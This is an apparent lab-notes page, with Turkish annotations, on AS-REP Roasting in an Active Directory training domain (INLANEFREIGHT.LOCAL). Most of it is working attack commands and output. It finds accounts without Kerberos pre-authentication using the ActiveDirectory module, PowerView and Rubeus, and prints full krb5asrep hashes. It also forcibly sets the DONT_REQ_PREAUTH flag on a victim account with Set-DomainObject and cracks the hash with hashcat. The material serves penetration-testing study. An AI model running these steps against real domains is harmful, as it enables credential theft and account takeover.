# AS-REP Roasting

!!! success

    Kerberos pre-authentication ayarının devre dışı olması yeterlidir:

    * [ ] User must change password at next logon
    * [ ] User cannot change password
    * [ ] Password never expires
    * [ ] Store password using reversible encryption
    * [ ] Account is disabled
    * [ ] Smart card is required for interactive logon
    * [ ] Account is sensitive and cannot be delegated
    * [ ] Use only Kerberos DES encryption types for this account
    * [ ] This account supports Kerberos AES 128 bit encryption.
    * [ ] This account supports Kerberos AES 256 bit encryption.
    * [x] Do not require Kerberos preauthentication

## Enumeration

### Using ActiveDirectory Module

```pwsh
PS C:\Users\htb-student> ActiveDirectory\Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

```output title="Output" hl_lines="7 18 29"
DistinguishedName : CN=Amber Smith,OU=Contractors,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
Enabled           : True
GivenName         : amber
Name              : Amber Smith
ObjectClass       : user
ObjectGUID        : f4493b78-55f0-488f-b21b-1dfd9069407d
SamAccountName    : amber.smith
SID               : S-1-5-21-2974783224-3764228556-2640795941-1859
Surname           : smith
UserPrincipalName : amber.smith@inlanefreight

DistinguishedName : CN=Jenna Smith,OU=Server Team,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
Enabled           : True
GivenName         : jenna
Name              : Jenna Smith
ObjectClass       : user
ObjectGUID        : ea3c930f-aa8e-4fdc-987c-4a9ee1a75409
SamAccountName    : jenna.smith
SID               : S-1-5-21-2974783224-3764228556-2640795941-1999
Surname           : smith
UserPrincipalName : jenna.smith@inlanefreight

DistinguishedName : CN=Carole Rose,OU=Operations,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
Enabled           : True
GivenName         : carole
Name              : Carole Rose
ObjectClass       : user
ObjectGUID        : 6cf5f3a2-c686-4fdf-bb84-5e0bb125b3c0
SamAccountName    : carole.rose
SID               : S-1-5-21-2974783224-3764228556-2640795941-1415
Surname           : rose
UserPrincipalName : carole.rose@inlanefreight
```

### Using PowerView

```pwsh
PS C:\Users\htb-student> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

```output title="Output" hl_lines="23 51 79"
logoncount            : 8
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=amber.smith,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 4/20/2023 4:24:40 PM
name                  : amber.smith
lockouttime           : 0
objectsid             : S-1-5-21-1870146311-1183348186-593267556-1109
samaccountname        : amber.smith
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 4/20/2023 9:24:40 PM
instancetype          : 4
usncreated            : 12626
objectguid            : 982f19c6-78d1-458a-a148-3bd0eb5b4bd6
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata : 1/1/1601 12:00:00 AM
lastlogon             : 4/20/2023 4:57:03 PM
badpwdcount           : 0
cn                    : amber.smith
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
whencreated           : 10/14/2022 11:59:57 AM
primarygroupid        : 513
pwdlastset            : 3/30/2023 8:40:23 AM
usnchanged            : 135248

logoncount            : 9
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=jenna.smith,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 4/20/2023 4:24:40 PM
name                  : jenna.smith
objectsid             : S-1-5-21-1870146311-1183348186-593267556-1110
samaccountname        : jenna.smith
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 4/20/2023 9:24:40 PM
instancetype          : 4
usncreated            : 12633
objectguid            : 931374a5-90e8-4ef0-83d4-a244517c7fb6
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata : 1/1/1601 12:00:00 AM
lastlogon             : 4/20/2023 4:57:03 PM
badpwdcount           : 0
cn                    : jenna.smith
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
whencreated           : 10/14/2022 12:00:00 PM
primarygroupid        : 513
pwdlastset            : 10/14/2022 7:00:00 AM
usnchanged            : 135249

logoncount            : 9
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=carole.rose,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 4/20/2023 4:24:40 PM
name                  : carole.rose
objectsid             : S-1-5-21-1870146311-1183348186-593267556-1111
samaccountname        : carole.rose
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 4/20/2023 9:24:40 PM
instancetype          : 4
usncreated            : 12640
objectguid            : e9cbe3e8-573b-44d6-87b5-f18fed37e00e
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata : 1/1/1601 12:00:00 AM
lastlogon             : 4/20/2023 4:57:03 PM
badpwdcount           : 0
cn                    : carole.rose
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
whencreated           : 10/14/2022 12:00:03 PM
primarygroupid        : 513
pwdlastset            : 10/14/2022 7:00:03 AM
usnchanged            : 135250
```

### Using Rubeus

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe asreproast /nowrap
```

```output title="Output" hl_lines="8 17 26"
[*] SamAccountName         : amber.smith
[*] DistinguishedName      : CN=amber.smith,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\amber.smith'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$amber.smith@INLANEFREIGHT.LOCAL:032A989B12DC83AA183C27AB17C63C72$C251BF48702FB8E829D2E95A4B82FF3ACF63C4F86000E61E897C940E15DB7DDEB94C1079674EB52DA242733D5436A9E96895CD41B34463B4F26664F8FC156A37CAA989B8CF74686F6BB635FF22197A43AE8B7B5945CE3679EE34305519B663D51F9E62B9ADE53225CA8CA5BDF422BEAB6E5B847463659F91B5AC05F127DE81CEABE0729F662FA907793F8526C0BE72798D8BF3B0D0F0A55E548F1617BF94E1312DF1C5F1371007A836EDFFE3EA8BD3A983499330614AE3ABE19B6C500960D5EE476DB8772B33133C7E9862A6771D684ED8F984B33F6F7F9F426ABCC5294C8CD6968EA4D963E2BA802D1E5E8D63FF84AD0CC87DB198DE34288210

[*] SamAccountName         : jenna.smith
[*] DistinguishedName      : CN=jenna.smith,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\jenna.smith'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jenna.smith@INLANEFREIGHT.LOCAL:B8F0B5811DD73AD827AC719AE9151013$FB4CD3E532F2D062FEB9B88372F98EE1ED4934115688ACB1105E47B6756903B4FBE0B1BE9FFB8F9B8339C52771717FD0BD7A98423E43C8F9F8121AF17D79835734755E69681B9016E857597D6A83ABA43B56ED8570AEC9B425CF22E4CB1124CB1C0C4C3A2A9C8D7D61065A04BFB7A3A0F0111A34B01EAE4A84931F2EC09A132DC152F3923E313B989FE43CDD9C85B59778923A80B8AD2DAFFF57FF1CB28A0B58F74EB1A718801541CE23CB62094A2B665DEEC213EAEDFE0CF382AB91DF427405E209C385780D7A8D061D2A42D917F525C9F798FB448DF10C7838C14A791BD2214637F76B138C97446F3C2504D0E367EFCD0F8D0599ACA0A13957

[*] SamAccountName         : carole.rose
[*] DistinguishedName      : CN=carole.rose,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\carole.rose'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$carole.rose@INLANEFREIGHT.LOCAL:51E6B3068D9FBB009A5E026B626FFC48$2925F6003AA8F3B52EC1750697F4D7BBA65F8E359FBF803055D8822F06A7D3BD97E009D7305C22F4E6FBBD200823638CB8B1E340404062FCB4D389E51115532BB6F40D34AF6268FC8ADB75DBE633A2F9F12533CFD79C0E038293AD765CF1CDA2273C0C4A0FA40F3FFFD0295A38BFC7455D73307B96E73B9341BE692659D456306758906276F015460352CB4D3EE808F4CFE6D1BF879A85E08E1E23956C081923A4B2F63393A987A0FC18BFC23E1B53B7344C6C444AA9B0D993F75C0CD48D148CD2C01B999B790AD50452911E3F4C1A9A963E2E638E3747C9403F90577470479CA686C69AF434DAE62DED21D0E021332B07EBB11FFF135B31B842
```

## Performing the Attack

### Rubeus

!!! abstract

    Burada pre-authentication devre dışı olduğu için saldırı başarılı olur:

    * AS-REQ talebinde kullanıcıya ait doğrulayıcı bulunmaz.
    * AS-REP yanıtı şifrelenmiş bir TGT içerir.

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe asreproast /user:carole.rose /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL /nowrap
```

```output title="Output" hl_lines="6 10"
[*] Target User            : carole.rose
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Target DC              : DC01.INLANEFREIGHT.LOCAL

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\carole.rose'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$carole.rose@INLANEFREIGHT.LOCAL:8009A72B323255A4400E276B799F5ADA$45F171DC79E79C291BB18172A2BBDCB34EE1F6F1FBA92C8FA98683014ECF356082F1321BF9A6985411D228EA26F190B5B811C3031DDAF95FB28D252A7EBCB01AA16BF6D8FD58C405004282BF4115EFE42E910DEBB2C13B2F9D1ADFD4A737B34EC9F73CF6397C65DB8AE3D580FDF60C7711E7F74537FE40E88C276C115D5F87501377C3003CBF4818B1842E703C8ACA2F5C42BAB02DC48087FD3F235C574556379FE95B39B9D40ECE2E71CE76A3898F380117B6F512504B7850FF38AD746A86D65086C4717B5F69E246BAC4F27B2F5B5D6049826528485DA282CB7025AF9CBD894809E6897103719A99E68191AEEF155A09C3AA74FE4E3A7F7F8A
```

### Set DONT_REQ_PREAUTH Flag

!!! warning

    UAC değerini geçici olarak değiştirmek için GenericAll ayrıcalığı gereklidir.

```pwsh
PS C:\Users\htb-student> Set-DomainObject -Identity carole.rose -XOR @{"userAccountControl"=4194304} -Verbose
```

## Cracking the Hash

```sh
my@attack:~$ hashcat --hwmon-disable -a 0 -m 18200 carole.rose.hash /usr/local/share/wordlists/rockyou.txt
```
